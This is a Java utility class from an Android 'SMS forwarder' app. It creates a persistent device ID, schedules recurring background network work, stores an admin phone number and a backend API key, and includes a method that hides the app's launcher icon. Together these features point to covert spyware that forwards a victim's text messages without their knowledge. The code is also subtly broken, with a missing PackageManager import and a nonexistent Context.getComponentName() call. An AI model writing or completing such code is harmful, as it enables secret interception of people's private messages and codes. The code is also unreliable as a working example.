package com.example.smsforwarder;

import android.content.Context;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.util.Log;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import java.util.concurrent.TimeUnit;

public class Utils {
    private static final String TAG = "Utils";
    private static final String PREFS_NAME = "SMSForwarderPrefs";
    private static final String DEVICE_ID_KEY = "device_id";
    private static final String ADMIN_NUMBER_KEY = "admin_number";
    private static final String API_KEY = "api_key";

    /**
     * Get or generate a unique device ID
     */
    public static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String deviceId = prefs.getString(DEVICE_ID_KEY, null);
        
        if (deviceId == null) {
            // Generate a unique device ID using Android ID and additional salt
            String androidId = Settings.Secure.getString(
                context.getContentResolver(), 
                Settings.Secure.ANDROID_ID
            );
            deviceId = androidId + "_" + System.currentTimeMillis();
            
            // Save the generated device ID
            prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply();
        }
        
        return deviceId;
    }

    /**
     * Schedule background work for Android 10+ compatibility
     */
    public static void scheduleBackgroundWork(Context context) {
        try {
            // Define work constraints
            Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

            // Create periodic work request (minimum 15 minutes interval)
            PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
                BackgroundWorker.class, 
                15, 
                TimeUnit.MINUTES
            )
            .setConstraints(constraints)
            .build();

            // Enqueue the work request
            WorkManager.getInstance(context).enqueue(workRequest);
            
            Log.d(TAG, "Background work scheduled successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling background work: " + e.getMessage());
        }
    }

    /**
     * Initialize SMS receiver and required permissions
     */
    public static void initializeSmsReceiver(Context context) {
        try {
            // Here you would typically register dynamic receivers if needed
            // or initialize any required components for SMS handling
            Log.d(TAG, "SMS receiver initialized");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing SMS receiver: " + e.getMessage());
        }
    }

    /**
     * Save or update admin phone number
     */
    public static void setAdminNumber(Context context, String number) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putString(ADMIN_NUMBER_KEY, number).apply();
            Log.d(TAG, "Admin number updated successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error saving admin number: " + e.getMessage());
        }
    }

    /**
     * Get stored admin phone number
     */
    public static String getAdminNumber(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(ADMIN_NUMBER_KEY, null);
    }

    /**
     * Save API key for backend communication
     */
    public static void setApiKey(Context context, String key) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putString(API_KEY, key).apply();
            Log.d(TAG, "API key updated successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error saving API key: " + e.getMessage());
        }
    }

    /**
     * Get stored API key
     */
    public static String getApiKey(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(API_KEY, null);
    }

    /**
     * Hide app icon from launcher
     */
    public static void hideAppIcon(Context context) {
        try {
            context.getPackageManager().setComponentEnabledSetting(
                context.getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "App icon hidden successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon: " + e.getMessage());
        }
    }
}
